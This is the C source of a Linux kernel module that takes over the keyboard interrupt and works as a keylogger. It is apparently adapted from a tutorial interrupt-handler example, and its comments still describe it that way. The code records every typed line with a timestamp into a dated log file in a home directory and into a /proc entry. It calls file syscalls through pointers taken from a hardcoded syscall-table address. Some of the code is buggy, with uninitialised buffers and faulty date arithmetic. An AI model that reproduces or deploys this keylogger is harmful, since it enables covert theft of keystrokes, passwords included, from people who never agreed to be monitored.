/*
 * intrpt.c - An interrupt handler.
 *
 * Copyright (C) 2001 by Peter Jay Salzman
 */
 
/*
 * The necessary header files
 */
 
/*
 * Standard in kernel modules
 */
 
#include <linux/kernel.h>       /* We're doing kernel work */
#include <linux/module.h>       /* Specifically, a module */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h>    /* We want an interrupt */
#include <asm/io.h>
#include <linux/syscalls.h>

/* for proc file */
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/vmalloc.h>
#include <asm/uaccess.h>

#define MAX_LEN       4096
int read_info( char *page, char **start, off_t off,int count, int *eof, void *data );
ssize_t write_info( struct file *filp, const char __user *buff,unsigned long len, void *data );
void write_proc_file(char *buffer,char *path);

static struct proc_dir_entry *proc_entry;
static char *info;
static int write_index;
static int read_index;
/* proc entr end */


#define MY_WORK_QUEUE_NAME "WQsched.c"
static struct workqueue_struct *my_workqueue;
static char* scancode_ref = NULL;

char backSpace[4]="\\b";
char USER_NAME[7]="USRNAM\0";
char USER_TIME[11]="###:##:###"; 
char log_filename[11]="##_##_####";
unsigned long *syscall_table = (unsigned long *) 0xffffffff81600340;

void print_time(char char_time[]); 
void write_file(char *,char *);

asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
asmlinkage size_t (*original_read)(int, char *, size_t);
asmlinkage int (*original_close)(unsigned int);
asmlinkage int (*original_open)(const char __user *, int, int);

/*
 * This will get called by the kernel as soon as it's safe
 * to do everything normally allowed by kernel modules.
 */
int index1;
unsigned int id;
int isPrinted=1;
int isShiftPressed=0;
unsigned char arr[128]={0,  0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',	/* 14th for backspace */
  '\t','q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',/* 28 Enter key */
    0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`',  
   0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/',   /* 42 left shift, 43 for '\' but printing '\\' */
  0, /* 54 right shift */
  0, 0, ' ',	/* Space bar */
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0, 0,0, 0,  0, 0};
// for shift: press is 42 and release i -86
unsigned char shift_arr[128]={0,  0, '!', '@', '#', '$', '%', '^', '&', '*','(', ')', '_', '+', '\b',	/* Backspace */
  '\t','Q', 'W', 'E', 'R','T', 'Y', 'U', 'I', 'O', 'P', '{', '}', '\n',	/* 28 Enter key */
    0,'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ':',	'\"', '~',   
    0, /* 42 left shift */ '|', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', '<', '>', '?',   
   0, /* 54 right shift */				
  0, 0, ' ',	/* Space bar */
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0, 0,0, 0,  0, 0};

static void got_char(struct work_struct *work)
{

  char key_buff[200], key[10], path[120],timebuf[230],procPath[100];
  char scancode = scancode_ref ? *scancode_ref : 0;
  index1 =(int)scancode;
  id=scancode;
 // printk(KERN_INFO "SCAN CODE %d \n",index1);

	strcpy(path,"/home/hetalsavaliya/output/file/");
	strcat(path,log_filename);

	if(isPrinted==1)
	{
		print_time(USER_TIME);    // Get Current Time
	  	strcpy(key_buff,USER_TIME+1);    // Store Time in Log Array
		isPrinted=0;
	}
/*
	printk(KERN_INFO "Scan Code %x arr[%d=%d]=%c %s.\n",
		     scancode & 0x7F,index1,id, arr[index1],
		     (scancode & 0x80) ? "Released" : "Pressed");

*/
	if(scancode & 0x80) 
        { 
		if(index1==-86 || index1==-74)// shift release
			isShiftPressed=0;
		
	}
	else
	{
		
		if(index1==42 || index1==54)
			isShiftPressed=1;
		
		if(index1==14) //backspace
		{
			sprintf(key,"%s",backSpace);
			strcat(key_buff,key);
		}
		else if(isShiftPressed==true)
		{
			sprintf(key,"%c",shift_arr[index1]);
			strcat(key_buff,key);
		}
		else
		{
			sprintf(key,"%c",arr[index1]);
			strcat(key_buff,key);
		}
		
		printk(KERN_INFO "Scan Code %x %d:%s %s.\n",
		     scancode & 0x7F,index1,key,
		     (scancode & 0x80) ? "Released" : "Pressed");
		
		if(index1 == 28){
			
			//strcat(timebuf,key_buff);
			//sprintf(timebuf,"%s %s",USER_TIME+1,key_buff);
			write_file(key_buff,path);
			isPrinted=1;
			isShiftPressed=0;

			strcpy(procPath,"/proc/myModule");
			write_proc_file(key_buff,procPath);
			
		}

	}
}
 
/*
 * This function services keyboard interrupts. It reads the relevant
 * information from the keyboard and then puts the non time critical
 * part into the work queue. This will be run when the kernel considers it safe.
 */
irqreturn_t irq_handler(int irq, void *dev_id)
{
	  /*
	   * This variables are static because they need to be
	   * accessible (through pointers) to the bottom half routine.
	   */
	  static int initialised = 0;
	  static unsigned char scancode;
	  static struct work_struct task;
	  unsigned char status;
	  /*
	   * Read keyboard status
	   */
	  status = inb(0x64);
	  scancode = inb(0x60);
	  scancode_ref = &scancode;    
	 
	  if (initialised == 0) {
	    INIT_WORK(&task, got_char);
	    initialised = 1;
	  } else {
	    PREPARE_WORK(&task, got_char);
	  }

	  queue_work(my_workqueue, &task);
	  return IRQ_HANDLED;
}

void write_file(char *buffer,char *path)
{
	 mm_segment_t old_fs;
	int fd;
	   
	 old_fs=get_fs();
         set_fs(KERNEL_DS);   
         fd = original_open(path, O_WRONLY|O_CREAT|O_APPEND,0777);
	
	printk(KERN_INFO "In write file %d %s \n",fd,buffer);
      	   
         if(fd >= 0)     
	{
		printk(KERN_INFO "Ready to write!!! %s \n",path);
               	original_write(fd,buffer,strlen(buffer));  
                original_close(fd);                  
        }
	else
	{
		printk(KERN_ALERT "\n Errro in write_file() while opening a file");
	}

	set_fs(old_fs);
	return;
}
/************ function for proc ****************/
void write_proc_file(char *buffer,char *path)
{
	
	mm_segment_t old_fs;
	int fd;
	old_fs=get_fs();
	set_fs(KERNEL_DS);
	fd = original_open(path, O_WRONLY|O_APPEND,0677);
	// printk(" %d %s",fd,buffer);
	if(fd != 0)
	{
		write_info(fd,buffer,strlen(buffer),buffer);
		original_close(fd);
	}
	else
	{
		printk(KERN_ALERT "\n Errro in write_proc_file() while opening a file");
	}
	set_fs(old_fs);

		
		
	return;
}
ssize_t write_info( struct file *filp, const char __user *buff, unsigned long len, void *data )
{
    int capacity = (MAX_LEN-write_index)+1;
    if (len > capacity)
    {
        printk(KERN_INFO "No space to write in myIntrpt!\n");
        return -1;
    }
    if (copy_from_user( &info[write_index], buff, len+1 ))
    {
        return -2;
    }
	
	printk(KERN_ALERT "\n write in proc file: %s", buff);
    write_index += len;
    info[write_index-1] = 0;
    return len;
}

int read_info( char *page, char **start, off_t off, int count, int *eof, void *data )
{
    int len;
    if (off > 0)
    {
        *eof = 1;
        return 0;
    }

    if (read_index >= write_index)
    read_index = 0;

    len = sprintf(page, "%s\n", &info[read_index]);
    read_index += len;
    return len;
}
/************ function for proc end ****************/
int init_module()
{
  	my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);
   
	// for write in file
	original_write= (void *)syscall_table[__NR_write];
	original_read=(void *)syscall_table[__NR_read];
	original_close=(void *)syscall_table[__NR_close];
	original_open=(void *)syscall_table[__NR_open];
	
	/* create a Proc file */	
	
	    int ret = 0;
	    info = (char *)vmalloc( MAX_LEN );
	    memset( info, 0, MAX_LEN );
	    proc_entry = create_proc_entry( "myIntrpt", 0677, NULL );

	    if (proc_entry == NULL)
	    {
		ret = -1;
		vfree(info);
		printk(KERN_INFO "myIntrpt could not be created\n");
	    }
	    else
	    {
		write_index = 0;
		read_index = 0;
		proc_entry->read_proc = read_info;
		proc_entry->write_proc = write_info;
		printk(KERN_INFO "myIntrpt created.\n");
	    }

	    

	/*   */
  /*
   * Since the keyboard handler won't co-exist with another handler,
   * such as us, we have to disable it (free its IRQ) before we do
   * anything. Since we don't know where it is, there's no way to
   * reinstate it later - so the computer will have to be rebooted
   * when we're done.
   */
  free_irq(1, NULL);
  /*
   * Request IRQ 1, the keyboard IRQ, to go to our irq_handler.
   * SA_SHIRQ means we're willing to have othe handlers on this IRQ.
   * SA_INTERRUPT can be used to make the handler into a fast interrupt.
   */
  return request_irq(1,    /* The number of the keyboard IRQ on PCs */
             irq_handler, /* our handler */
             IRQF_SHARED, "test_keyboard_irq_handler",
             (void *)(irq_handler));
}
 
/*
 * Initialize the module - register the IRQ handler
 */
void print_time(char char_time[])
{
 struct timeval my_tv;
 int sec, hr, min, tmp1, tmp2;
 int days,years,days_past_currentyear;
 int i=0,month=0,date=0;
 unsigned long get_time;
 char_time[11]="#00:00:00#";

	
	do_gettimeofday(&my_tv);                    // Get System Time From Kernel Mode
	get_time = my_tv.tv_sec;                   // Fetch System time in Seconds
//	printk(KERN_ALERT "\n %ld",get_time);
	get_time = get_time + 43200;
	sec = get_time % 60;                       // Convert into Seconds
	tmp1 = get_time / 60;
	min = tmp1 % 60;                          // Convert into Minutes
	tmp2 = tmp1 / 60;
	hr = (tmp2+4) % 24;                      // Convert into Hours
        hr=hr+1;
	char_time[1]=(hr/10)+48;                // Convert into Char from Int
	char_time[2]=(hr%10)+48;
	char_time[4]=(min/10)+48;
	char_time[5]=(min%10)+48;
	char_time[7]=(sec/10)+48;
	char_time[8]=(sec%10)+48;
	char_time[10]='\0';
	/* calculating date from time in seconds */
	days = (tmp2+4)/24;
	days_past_currentyear = days % 365;
	years = days / 365;
	for(i=1970;i<=(1970+years);i++)
	{
		if ((i % 4) == 0)
	 		days_past_currentyear--;
	}

	if((1970+years % 4) != 0)
	{
		if(days_past_currentyear >=1 && days_past_currentyear <=31)
		{
			month=1; //JAN
			date = days_past_currentyear;

		}
		else if (days_past_currentyear >31 && days_past_currentyear <= 59)
		{
			month = 2;
			date = days_past_currentyear - 31;
		}

		else if (days_past_currentyear >59 && days_past_currentyear <= 90)
		{
        		month = 3;
        		date = days_past_currentyear - 59;
		}
		else if (days_past_currentyear >90 && days_past_currentyear <= 120)
		{
        		month = 4;
        		date = days_past_currentyear - 90;
		}
		else if (days_past_currentyear >120 && days_past_currentyear <= 151)
		{
        		month = 5;
		        date = days_past_currentyear - 120;
		}	
		else if (days_past_currentyear >151 && days_past_currentyear <= 181)
		{
        		month = 6;
		        date = days_past_currentyear - 151;
		}
		else if (days_past_currentyear >181 && days_past_currentyear <= 212)
		{
        		month = 7;
        		date = days_past_currentyear - 181;
		}
		else if (days_past_currentyear >212 && days_past_currentyear <= 243)
		{
        		month = 8;
        		date = days_past_currentyear - 212;
		}
		else if (days_past_currentyear >243 && days_past_currentyear <= 273)
		{
        		month = 9;
        		date = days_past_currentyear - 243;
		}
		else if (days_past_currentyear >273 && days_past_currentyear <= 304)
		{
        		month = 10;
        		date = days_past_currentyear - 273;
		}

		else if (days_past_currentyear >304 && days_past_currentyear <= 334)
		{
        		month = 11;
       			date = days_past_currentyear - 304;
		}
		else if (days_past_currentyear >334 && days_past_currentyear <= 365)
		{
        		month = 12;
        		date = days_past_currentyear - 334;
		}
		
	//	printk(KERN_ALERT "month=%d date=%d year=%d",month,date,(1970+years));
		
	}
	// for leap years..
	else
	{
		if(days_past_currentyear >=1 && days_past_currentyear <=31)
		{
        		month=1; //JAN
        		date = days_past_currentyear;

		}
		else if (days_past_currentyear >31 && days_past_currentyear <= 60)
		{
       			month = 2;
        		date = days_past_currentyear - 31;
		}

		else if (days_past_currentyear >60 && days_past_currentyear <= 91)
		{
        		month = 3;
        		date = days_past_currentyear - 60;
		}
		else if (days_past_currentyear >91 && days_past_currentyear <= 121)
		{
        		month = 4;
        		date = days_past_currentyear - 91;
		}
		else if (days_past_currentyear >121 && days_past_currentyear <= 152)
		{
        		month = 5;
        		date = days_past_currentyear - 121;
		}
		else if (days_past_currentyear >152 && days_past_currentyear <= 182)
		{
        		month = 6;
        		date = days_past_currentyear - 152;
		}
		else if (days_past_currentyear >182 && days_past_currentyear <= 213)
		{
        		month = 7;
        		date = days_past_currentyear - 182;
		}
		else if (days_past_currentyear >213 && days_past_currentyear <= 244)
		{
        		month = 8;
        		date = days_past_currentyear - 213;
		}
		else if (days_past_currentyear >244 && days_past_currentyear <= 274)
		{
        		month = 9;
        		date = days_past_currentyear - 244;
		}
		else if (days_past_currentyear >274 && days_past_currentyear <= 305)
		{
        		month = 10;
        		date = days_past_currentyear - 274;
		}

		else if (days_past_currentyear >305 && days_past_currentyear <= 335)
		{
        		month = 11;
        		date = days_past_currentyear - 305;
		}
		else if (days_past_currentyear >335 && days_past_currentyear <= 366)
		{
        		month = 12;
        		date = days_past_currentyear - 335;
		}

		//	printk(KERN_ALERT "\nmonth=%d date=%d year=%d",month,date,(1970+years));


	}
	 log_filename[0]=(month/10)+48;                // Convert into Char from Int
                log_filename[1]=(month%10)+48;
                log_filename[3]=(date/10)+48;
                log_filename[4]=(date%10)+48;
                tmp1 = ((1970+years) % 10) + 48;
                log_filename[9]= tmp1;
                tmp1 = (1970+years)/ 10;
                tmp2 = tmp1 % 10;
                log_filename[8]= tmp2 + 48;
                tmp1 = tmp1 / 10;
                tmp2 = tmp1 % 10;
                log_filename[7]=tmp2 + 48;
                tmp1 = tmp1 / 10;
                log_filename[6]= tmp1+48;
                log_filename[10]='\0';
    
}

 
/*
 * Cleanup
 */
void cleanup_module()
{
  /*
   * This is only here for completeness. It's totally irrelevant, since
   * we don't have a way to restore the normal keyboard interrupt so the
   * computer is completely useless and has to be rebooted.
   */
  free_irq(1, NULL);
}
 
/*
 * some work_queue related functions are just available to GPL licensed Modules
 */
MODULE_LICENSE("GPL");

